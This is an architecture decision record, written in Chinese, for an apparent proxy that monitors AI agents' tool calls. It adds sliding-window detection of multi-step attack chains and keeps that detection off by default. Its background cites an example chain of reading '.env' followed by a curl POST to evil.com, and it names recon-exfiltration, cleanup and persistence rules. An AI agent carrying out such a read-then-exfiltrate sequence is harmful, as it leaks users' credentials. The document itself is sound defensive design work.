# ADR-022: 行为序列联动窗口——滑动窗口序列检测 + beta 默认关闭 + 四路由双路径不变量

## 状态

**已接受**

> 决策日期：2026-05-01
> 范围：Phase B (Week 8-12)，`sieve-core::pipeline::inbound::SessionState` 扩展，GA **默认关闭**
---

## 背景

### 单次检测的覆盖盲区

入站检测的每条规则独立评估单次 tool_use，无法识别多步 kill chain 中的"良性外观操作链"——每一步单独看都不触发规则，但组合在一起是明确攻击：

- `Read(".env")` → 单次看是正常文件读取；
- `curl POST https://evil.com` → 单次看可能只是 Medium；
- 两步连续在短时间内发生 → RECON-EXFIL kill chain。

### 早期草案的 input hash 方案缺陷

早期草案 `ToolUseRecord` 只存 `input_hash` 和 `rule_hits`。评审指出此方案无法识别**未命中单次规则的良性外观操作**：序列模式匹配需要的是**语义特征**，不是原始内容的 hash。input hash 方案废弃，改为结构化安全特征。

### GA 默认关闭的决策逻辑

行为序列检测存在两类客观风险：

1. **FP 失控风险**：启发式规则未经充分真实用户数据验证；
2. **串会话风险**：序列窗口归属实现错误时可能跨连接、跨会话混淆上下文。

评审结论：行为序列不应作为 GA 必达卖点，推荐 beta flag 默认关闭，闭测用户 opt-in 收集数据后再评估后续版本是否默认开启。

---

## 决策

### 1. 结构化安全特征（否定 input hash 方案）

`ToolUseRecord` 存储隐私安全的结构化特征，不存储原始 input 内容或 hash。特征字段涵盖工具类别、路径分类、网络外发标记、持久化机制标记、清痕机制标记、敏感文件提示及单次规则命中列表。

**设计理由**：
- **隐私**：不存原始命令/参数，只存编译期定义的 boolean 和枚举特征，无法从记录还原用户输入；
- **序列可识别**：即使单次不触发规则，结构化特征也会被记录，供序列模式匹配使用；
- **ML 升级路径**：结构化特征可直接作为未来 ML 分类器的训练 feature vector。

具体字段定义和各字段的判别启发式不随本文档公开发布。

### 2. 滑动窗口设计

`InboundFilter::SessionState` 加 `ToolUseSequence`。窗口大小和 TTL 为 MVP 保守起步值，具体参数不随本文档公开发布，实现后以真实 dogfood 数据调优，后续版本可能调整。

**会话隔离**：每个 HTTP 连接独立维护 `ToolUseSequence` 实例，**禁止跨连接共享**。daemon 重启后序列窗口清空（不持久化），防止跨会话污染。

### 3. IN-SEQ-* 启发式规则（Phase B MVP）

Phase B 实现 3 条序列规则（`IN-SEQ-01-RECON-EXFIL`、`IN-SEQ-02-CLEANUP-AFTER-ATTACK`、`IN-SEQ-03-PERSISTENCE-CHAIN`）+ 框架骨架，更多模式后续按真实 dogfood 数据补充。

各规则的精确特征组合模式不随本文档公开发布。

**严重度 + 处置**：IN-SEQ-* 规则 severity=High，disposition=StatusBar，**不引入新 Block 路径**。序列检测的误判只带来通知打扰，不阻断合法操作。

### 4. GA 默认关闭

Phase B 行为序列检测通过 Cargo features 控制：

```toml
# Cargo.toml [features]
[features]
default = []                      # sequence_detection 不在 default 中
sequence_detection = []           # 必须显式 opt-in
```

config.toml 层面：

```toml
[features]
sequence_detection = false        # GA 默认关闭
```

daemon 启动时若 `sequence_detection=false`，跳过序列窗口初始化，`InboundFilter` 不维护 `ToolUseSequence`（零开销）。

闭测用户 + dogfood 用户主动将 `sequence_detection = true` 配置开启。

### 5. 四路由双路径不变量

序列窗口更新必须同时覆盖 SSE 流路径和非流式 JSON 路径：

| 更新点 | 路径 | 实现位置 |
|--------|------|---------|
| Anthropic SSE tool_use | SSE 聚合器解析 `content_block_stop` 后 | `forward_with_inbound_inspection` |
| Anthropic JSON tool_use | JSON helper 解析 `tool_use` block 后 | `handle_anthropic_json_inbound` |
| OpenAI SSE tool_calls | SSE delta 聚合器拼接 `tool_calls` 后 | `forward_with_openai_inbound_inspection` |
| OpenAI stream=false JSON | JSON helper 解析 `tool_calls` 后 | `handle_openai_json_inbound` |

**不满足该不变量视为 P0 漏洞**。

集成测试矩阵（Week 9 必须覆盖）：

| 协议 | 响应模式 | 序列触发测试 |
|------|---------|------------|
| Anthropic | text/event-stream（SSE 流）| ✅ |
| Anthropic | application/json（非流式）| ✅ |
| OpenAI | text/event-stream（stream=true）| ✅ |
| OpenAI | application/json（stream=false 默认）| ✅ |

每种组合都必须验证：mock RECON-EXFIL 攻击序列（2 步 tool_use）在对应路径下正确触发 IN-SEQ-01-RECON-EXFIL，并通过 StatusBar 通知。

### 6. 序列检测与单次检测的优先级关系

行为序列**不替代**单次检测，两者互补：

- 单次检测命中 Critical → 立即 Block（[ADR-007](./ADR-007-fail-closed-critical-actions.md) fail-closed），不等序列完成；
- 单次检测命中 High/Medium → 执行单次 disposition（StatusBar / Mark），同时把 `ToolUseRecord` 加入序列窗口；
- 序列触发 IN-SEQ-* → StatusBar 通知，不阻断后续请求。

### 7. 升级为 Block 类的触发条件（未来路径）

IN-SEQ-* 规则从 StatusBar 升级为 Block 类，需满足三条条件，缺一不可：

1. 真实用户连续 **4 周 ≥ 50 个**序列样本数据收集（audit.db IN-SEQ-* 事件）；
2. 该序列模式 **FP rate < 0.5%**（与 Critical 规则红线对齐）；
3. **写新 ADR** 评审，明确升级理由 + FP 数据 + 影响用户范围。

在满足条件前，**任何 PR 把 IN-SEQ-* disposition 改为 Block 必须阻塞**（CI 检查，未附新 ADR 则拒绝）。

---

## 影响

### 正面影响

1. **HIPS 能力补完**：行为序列检测补完单次检测在多步 kill chain 上的盲区；
2. **kill chain 早期预警**：识别"每步单独合法、整体是攻击"的多步操作链；
3. **隐私安全**：结构化特征不存原始 input，只存编译期枚举，与 "数据不上传" 承诺一致；
4. **零开销当 disabled**：GA 默认关闭时序列窗口不初始化，对 99% GA 用户无性能影响；
5. **ML 升级路径铺平**：结构化特征是未来 ML 分类器的天然训练 feature vector。

### 负面影响

1. **GA 默认关闭**：行为序列是 HIPS 升级的能力之一，但 GA 默认关闭、需 opt-in；
2. **InboundFilter 复杂度增加**：`SessionState` 加滑动窗口后，单元测试 + fuzz 覆盖范围扩大；
3. **四路径更新负担**：双路径不变量要求四个 HTTP handler 各自更新序列窗口，需抽公共 helper 函数；
4. **串会话风险需持续关注**：连接 ID 隔离依赖 daemon 正确实现，集成测试必须验证跨连接隔离。

### 需要更新的文档

- `docs/design/architecture.md` —— 加 `SessionState::ToolUseSequence` 在 pipeline 中的位置（Phase B 架构图）
- `docs/design/data-model.md` —— `ToolUseRecord` 结构化特征字段描述
- `docs/guides/development.md` —— 行为序列 opt-in 配置说明 + Week 9 集成测试矩阵运行命令
- `CHANGELOG`（Phase B ship 时）—— IN-SEQ-01/02/03 规则 ID + 默认关闭状态

---

## 相关文档

- [ADR-007](./ADR-007-fail-closed-critical-actions.md) —— fail-closed 原则（序列检测不阻断时 Critical 单次检测仍 fail-closed）
- [ADR-014](./ADR-014-dual-layer-defense.md) —— 双层防御（序列检测在 SSE 层，不影响 Hook 层）
